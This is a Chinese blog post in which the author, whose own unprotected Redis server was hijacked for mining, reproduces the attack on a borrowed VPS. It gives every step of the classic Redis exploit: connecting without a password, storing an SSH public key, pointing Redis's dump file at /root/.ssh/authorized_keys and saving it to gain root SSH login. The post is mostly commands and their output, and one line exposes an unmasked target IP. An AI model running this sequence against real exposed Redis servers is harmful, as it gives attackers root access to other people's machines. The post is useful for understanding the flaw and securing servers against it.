---
title: 使用redis漏洞攻击服务器
date: 2017-08-07 
tags: [redis漏洞, attack]
---
由于我的服务器上装了redis，又没有设置密码。所以将6379(redis默认的)端口暴露在公网中，所以被别人恶意当做挖矿机，我也想操作一下别人是怎么攻击我的服务器的

### 准备工作
我借了我同事妹子的VPS，作为攻击的测试机。首先在这台测试机上装redis，安装redis的步骤我已经在前几篇博客中有介绍，这里就不重复说了。
攻击者：107.182.xxx.xxx
被攻击者：45.78.xx.xx

然后我们就可以开始了.
首先我们先尝试连一下45的服务器
```bash
$ ssh root@45.78.xx.xx
```
结果当然是连不上

<!-- more -->

### 通过redis漏洞攻击

```bash
$ ./redis-cli -h 45.78.xx.xx
```
<img src='http://oo8ieb5e5.bkt.clouddn.com/image/vps/attack_redis_connect.png' />

这时我们已经成功连接redis

在当前这台服务器上生成公钥私钥
```bash
$ cd ~/.ssh
$ ssh-keygen -t rsa -C "1239391682@qq.com"
$ cp id_rsa.pub ~/
```
修改id_rsa.pub文件，在文件的开头和末尾添加回车(可以多加几个，我自己第一行加了一个回车，不太好用)
然后将公钥文件写入被攻击主机的redis

```bash
$ cd /usr/redis
$ cat ~/id_rsa.pub | ./redis-cli -h 45.78.xx.xx -x set ssh-key
> OK
```

现在我们重启连接进目标主机的redis
```bash
$ ./redis-cli -h 45.78.xx.xx
$ keys *
1) "ssh-key"
2) "test"
3) "attack"
$ get ssh-key
"\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyxRp0P6DTEpz7ACtwYGuFTdCOYW6yUflL4IsIWBa4IsvMQKd5ikx2MMJcacYYz5Xq+amYnPn3w/KDco9EUNlppbf5EQkdtQ8bWbURFUypOeqsr0HQwfesEUbGxCWlHzScGoUt9+sBGiKIKyKrGO99ccDQPnQcBl2JlTljvea8WVBym4rM0+L3ofYb0QVN9gvuZGDCa6wiefcAj81ii6Vv/Hb+YSE+Sl+tNVGBE01WCWmVx+u2oj0NwX2xLlCNt5Cl+6ns0bwu92Qa6mLybV0oWcy+GPFVjth52wFfVG/a2c96lZ/r+M8yik3Rq7yZKUYcw10J8sh0+9pwvXZZlUyqQ== 1239391682@qq.com\n\n\n"
```

公钥已经写入目标主机，接下来，我们使用config命令，分别查看redis写入日志的文件名和目录：
```bash
$ config get dir
1) "dir"
2) "/usr/redis"
$ config get dbfilename
1) "dbfilename"
2) "dump.rdb"
```

然后我们需要重新设置保存路径和日志文件名，并保存redis中的数据
```bash
$ config set dir /root/.ssh
OK
$ config set dbfilename "authorized_keys"
OK
$ save
OK
```

连接被攻击的服务器
```bash
$ ssh -p 26167 root@45.78.34.28
```

成功。
